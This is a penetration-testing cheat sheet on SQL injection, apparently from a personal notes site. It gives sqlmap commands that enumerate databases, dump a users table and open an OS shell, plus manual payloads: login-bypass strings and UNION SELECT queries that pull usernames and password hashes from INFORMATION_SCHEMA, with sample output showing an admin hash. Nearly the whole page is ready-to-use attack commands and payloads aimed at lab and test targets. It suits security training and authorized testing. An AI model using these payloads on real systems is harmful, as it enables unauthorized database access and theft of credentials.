---
title: SQL Injection
sidebar_label: SQL Injection
---
* [`sqlmap`](#sqlmap)
  * [GET request](#get-request)
  * [POST request](#post-request)
  * [databases](#databases)
  * [tables](#tables)
  * [data](#data)
  * [columns](#columns)
  * [os shell](#os-shell)
* [INFORMATION_SCHEMA](#information_schema)
  * [INFORMATION_SCHEMA Tables](#information_schema-tables)
* [Manual Methods](#manual-methods)
  * [check vulnerability](#check-vulnerability)
  * [enumerate fields of search query](#enumerate-fields-of-search-query)
  * [enumerate databases](#enumerate-databases)
  * [enumerate tables](#enumerate-tables)
  * [enumerate columns](#enumerate-columns)
  * [show data](#show-data)

# `sqlmap`
If we know the DBMS, we can use option `--dbms=mysql`
## GET request
```
sqlmap -u "http://example.com/?a=1&b=2&c=3" -p "a,b"
```
## POST request
```
sqlmap -u "http://example.com/" --data "a=1&b=2&c=3" -p "a,b" --method POST
```
Alternatively, copy the POST request in the intercept of burpsuite in a file and use it as follows
```
$ cat web.txt
POST /results.php HTTP/1.1
Host: 10.10.10.109
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Referer: http://10.10.10.109/search.php
Content-Type: application/x-www-form-urlencoded
Content-Length: 13
Connection: close
Upgrade-Insecure-Requests: 1

search=killer
```
```
sqlmap -r web.txt -p "search"
```
## databases
```
sqlmap -u "http://testphp.vulnweb.com/listproducts.php?cat=1" --dbs 
```
## tables
```
sqlmap -u "http://testphp.vulnweb.com/listproducts.php?cat=1" --tables -D testdb
```
## data
```
sqlmap -u "http://testphp.vulnweb.com/listproducts.php?cat=1" --dump -D testdb -T users
```
## columns
```
sqlmap -u "http://testphp.vulnweb.com/listproducts.php?cat=1" -D testdb -T users --columns
```
### os shell
```
sqlmap -u "http://testphp.vulnweb.com/listproducts.php?cat=1" --os-shell
```
# INFORMATION_SCHEMA
Refs:
* <https://www.cmi.ac.in/~madhavan/courses/databases10/mysql-5.0-reference-manual/information-schema.html#schemata-table>

INFORMATION_SCHEMA provides access to database metadata.

Metadata is data about the data, such as the name of a database or table, the data type of a column, or access privileges. INFORMATION_SCHEMA is the information database, the place that stores information about all the other databases that the MySQL server maintains. Inside INFORMATION_SCHEMA there are several read-only tables. They are actually views, not base tables, so there are no files associated with them.
## INFORMATION_SCHEMA Tables
* <https://dev.mysql.com/doc/refman/8.0/en/columns-table.html>
* <https://dev.mysql.com/doc/refman/8.0/en/schemata-table.html>
* <https://dev.mysql.com/doc/refman/8.0/en/st-units-of-measure-table.html>

# Manual Methods
## check vulnerability
```
' or 1='1
' or 1=1;--
' or 1=1;#
') or ('x'='x
' or like '%';--
' or 1=1 LIMIT 1;--

USERNAME: ' or 1/*
PASSWORD: */ =1 --

USERNAME: admin' or 'a'='a
PASSWORD '#
```
## enumerate fields of search query
In burpsuite, go to repeater mode and keep on increasing the numbers till the fields of search query gets printed on the webpage
```
search=killer' UNION SELECT 1,2,3,4,5,6-- -
```
```
<h3>Search results </h3>
ID: 1<br/>Name: 2 3<br/>Position: 4<br />Phone No: 5<br />Email: 6<br/>
```
## enumerate databases
### current database
```
search=killer' UNION SELECT database(),2,3,4,5,6-- -
```
```
<h3>Search results </h3> 
ID: Staff<br/>Name: 2 3<br/>Position: 4<br />Phone No: 5<br />Email: 6<br/>
```
### using INFORMATION_SCHEMA
```
search=killer' UNION SELECT SCHEMA_NAME,2,3,4,5,6 FROM INFORMATION_SCHEMA.SCHEMATA-- -
```
```
<h3>Search results </h3> 
ID: information_schema<br/>Name: 2 3<br/>Position: 4<br />Phone No: 5<br />Email: 6<br/><br/>ID: Staff<br/>Name: 2 3
<br/>Position: 4<br />Phone No: 5<br />Email: 6<br/><br/>ID: users<br/>Name: 2 3<br/>Position: 4<br />Phone No: 5<br />Email:
6<br/>
```
### all databases
```
search=killer' UNION SELECT GROUP_CONCAT(SCHEMA_NAME),2,3,4,5,6 FROM INFORMATION_SCHEMA.SCHEMATA-- -
```
```
<h3>Search results </h3>
ID: information_schema,Staff,users<br/>Name: 2 3<br/>Position: 4<br />Phone No: 5<br />Email: 6<br/>
```
## enumerate tables
```
search=killer' UNION SELECT GROUP_CONCAT(TABLE_NAME),2,3,4,5,6 FROM INFORMATION_SCHEMA.TABLES WHERE TABLE_SCHEMA="Staff"-- -
```
```
<h3>Search results </h3> 
ID: StaffDetails,Users<br/>Name: 2 3<br/>Position: 4<br />Phone No: 5<br />Email: 6<br/>
```
## enumerate columns
```
search=killer' UNION SELECT GROUP_CONCAT(COLUMN_NAME),2,3,4,5,6 FROM INFORMATION_SCHEMA.COLUMNS WHERE TABLE_SCHEMA="Staff" AND TABLE_NAME="Users"-- -
```
```
<h3>Search results </h3>
ID: UserID,Username,Password<br/>Name: 2 3<br/>Position: 4<br />Phone No: 5<br />Email: 6<br/>
```
## show data
```
search=killer' UNION SELECT GROUP_CONCAT(Username,":",Password),2,3,4,5,6 FROM Staff.Users-- -
```
```
<h3>Search results </h3>
ID: admin:856f5de590ef37314e7c3bdf6f8a66dc<br/>Name: 2 3<br/>Position: 4<br />Phone No: 5<br />Email: 6<br/>
```
